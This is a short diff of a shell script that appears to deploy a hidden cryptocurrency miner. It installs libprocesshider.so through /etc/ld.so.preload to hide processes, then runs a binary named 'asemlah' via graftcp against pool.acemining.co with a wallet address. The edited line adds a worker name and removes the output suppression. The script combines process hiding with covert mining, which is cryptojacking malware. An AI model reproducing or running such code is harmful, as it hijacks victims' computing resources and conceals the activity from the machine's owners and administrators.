@@ -55,4 +55,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./asemlah -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0 >/dev/null 2>&1
+./graftcp/graftcp ./asemlah -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -n cokjan -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0
